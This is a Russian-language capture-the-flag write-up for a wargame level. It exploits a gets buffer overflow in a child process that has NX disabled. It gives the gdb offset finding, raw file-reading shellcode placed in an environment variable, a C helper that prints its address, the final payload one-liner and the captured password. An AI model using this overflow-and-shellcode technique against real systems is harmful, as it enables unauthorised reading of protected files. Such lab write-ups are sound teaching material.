## Level04

Данная программа создает подпроцесс, который имеет незащищенный вызов `gets` и выключенный NX. Следовательно, он уязвим к buffer-overflow attack.



Отличие этого уровня от предыдущих в том, что родительский процесс предотвращает вызовы `exec` и ему подобные в дочернем подпроцессе. Поэтому вместо запуска оболочки, нам ничего не остается, как напрямую прочитать `.pass`.

С помощью [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) получаем, что необходимый нам offset равен 156 байтов.

```
> gdb level04
$ set follow-fork-mode child
$ run
Starting program: /home/users/level04/level04 
[New process 8570]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 8570]
0x41326641 in ?? ()
```

Воспользуемся [этим](http://shell-storm.org/shellcode/files/shellcode-73.php) shellcode-ом. Мы могли бы записать его в стэк, однако вышеуказанный shellcode занимает 289 байта, что превосходит 156 байтов, доступных нам на стэке.

Нам нужно записать shellcode в переменную окружения и узнать её адрес с помощью вспомогательного файла:

```c
// /tmp/test.c

#include <stdio.h>
#include <stdlib.h>

int main() { printf("%p\n", getenv("SHLCODE")); }
```
и 

```sh
> export SHLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
> ( cd /tmp ; gcc -m32 test.c -o bla )
> /tmp/bla
0xffffdebf
```

Итого,

```sh
> python -c 'print "a" * 156 + "\xff\xff\xde\xbf"[::-1]' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```

